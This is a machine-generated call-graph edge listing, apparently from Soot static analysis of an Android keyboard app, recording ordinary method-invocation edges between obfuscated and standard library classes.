CLINIT edge: staticinvoke <jlu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jlu: void <clinit>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r2) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: void setLength(int)>(0) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: void setLength(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>(ivv,java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: $i0 = specialinvoke r0.<java.util.AbstractMap: int hashCode()>() in <lvr: int hashCode()> ==> <java.util.AbstractMap: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void e(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void e(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gcs: void <init>(hbv,lma,int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<lsn: void ab(java.lang.String,java.lang.Object[])>($r1, $r4) in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: void ab(java.lang.String,java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<liy: void <init>(ljd)>(r0) in <ljd: java.util.Set entrySet()> ==> <liy: void <init>(ljd)>
CLINIT edge: staticinvoke <j$.util.concurrent.r: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.r: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<lkm: void <init>(lkq,int)>($r1, 0) in <lkq: void <clinit>()> ==> <lkm: void <init>(lkq,int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r1, 0) in <lqq: void <clinit>()> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r4.<oru: void <init>()>() in <ose: void <clinit>()> ==> <oru: void <init>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lly: lma g()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String b()>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r1, $i0) in <qj: int b(java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lkl: lkq g()> ==> <lkq: lkq h(java.lang.Object[],int)>
CLINIT edge: staticinvoke <lsq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsq: void <clinit>()>
SPECIAL edge: specialinvoke $r3.<ltc: void <init>(java.lang.String,int,int)>("LARGE", 2, 50) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r1.<gsv: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <gsv: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Object: java.lang.Class getClass()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(19) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r2 = staticinvoke <lkq: lkq q()>() in <lqs: void <clinit>()> ==> <lkq: lkq q()>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(12) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<androidx.core.content.FileProvider: void <init>()>() in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: void <init>()>
SPECIAL edge: specialinvoke r0.<lje: void a()>() in <lje: java.lang.Object next()> ==> <lje: void a()>
STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <ivw: boolean z(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<hcb: void <init>()>() in <hcb: void <clinit>()> ==> <hcb: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsm: java.lang.Object d(lsz)>
STATIC edge: $r0 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq g(java.lang.Object[])> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>(int)>(3) in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>(int)>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 97, 122, $i2) in <iwt: void g(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", parameter ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <mag: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r4.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_FULL_IMAGE", 4, 4) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lli: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r2 = staticinvoke <android.util.Base64: java.lang.String encodeToString(byte[],int)>($r1, 3) in <kes: java.lang.String k(nfe)> ==> <android.util.Base64: java.lang.String encodeToString(byte[],int)>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<ljb: void a()>() in <ljb: java.lang.Object getValue()> ==> <ljb: void a()>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean o(char)>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lta: void <init>(lsr,java.lang.Object)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lvq: int b()>() in <lvq: int size()> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.Exception: void <init>()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <lsm: void <init>()> ==> <lts: void <init>()>
SPECIAL edge: specialinvoke $r27.<mag: void <init>(java.lang.String,int,int)>("TENOR_FEATURED_METADATA", 27, 27) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ivv: java.lang.String c()>() in <ivv: ivw a()> ==> <ivv: java.lang.String c()>
CLINIT edge: staticinvoke <lvr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvr: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lup: void <init>(lwc,java.lang.String)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <ojg: void v(java.lang.String)>($r1) in <ojg: void d(java.lang.Object,java.lang.String)> ==> <ojg: void v(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lkl: void <init>()> ==> <lkg: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>($r3) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(1) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $i8 = interfaceinvoke $r14.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r9, $r15) in <lvr: void <init>(lvr,lvr)> ==> <jlu: int compare(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_ImeListLoaded", $r4) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfc: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.StringBuilder: int length()>() in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: int length()>
CLINIT edge: staticinvoke <ljd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljd: void <clinit>()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, $i4) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r5, $i0) in <lvr: void <init>(lvr,lvr)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
INTERFACE edge: $r7 = interfaceinvoke $r2.<ltn: lsq f()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: lsq f()>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.Throwable: void <init>()>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r1 = staticinvoke <lri: java.util.ArrayList N()>() in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <lri: java.util.ArrayList N()>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.LinkageError: void <init>()> ==> <java.lang.Error: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jvu: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>($r1, $r2, $r3, $r6) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(4) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r4, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(float[],float[])>($r14, $r15) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(float[],float[])>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <lwh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwh: void <clinit>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqm: int size()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Autocomplete", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r0.<jvu: void <init>(int)>(1) in <jvu: void <clinit>()> ==> <jvu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r2) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lkl: void h(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
CLINIT edge: staticinvoke <lum: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lum: void <clinit>()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("].") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r7 = staticinvoke <lvs: lvs a(java.lang.Object)>($r2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
CLINIT edge: staticinvoke <lvt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvt: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r4, $i0, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r11.<lvt: void <init>(lvr)>($r15) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: void <init>(lvr)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r2, $i2, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(2) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("cause", class "Ljava/lang/Throwable;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Class: boolean isAssignableFrom(java.lang.Class)>($r4) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: boolean isAssignableFrom(java.lang.Class)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(10) in <lvr: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(2) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r3 = staticinvoke <java.lang.Long: java.lang.Long valueOf(long)>($l0) in <hbu: hbs f(java.lang.String,long)> ==> <java.lang.Long: java.lang.Long valueOf(long)>
SPECIAL edge: specialinvoke $r5.<hno: void <init>()>() in <hnt: void <clinit>()> ==> <hno: void <init>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(13) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r1.<lsh: void <init>(lto)>($r2) in <lsh: lsh j(java.lang.String)> ==> <lsh: void <init>(lto)>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int)>($i1) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <lje: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Float: java.lang.Float valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <lkh: java.lang.Object[] toArray()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Set: java.util.Iterator iterator()>() in <ljf: java.util.Iterator iterator()> ==> <java.util.HashSet: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(java.util.List)> ==> <java.util.AbstractMap: void <init>()>
SPECIAL edge: specialinvoke r1.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Local", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(93) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r0) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean isEmpty()>() in <lqs: boolean equals(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
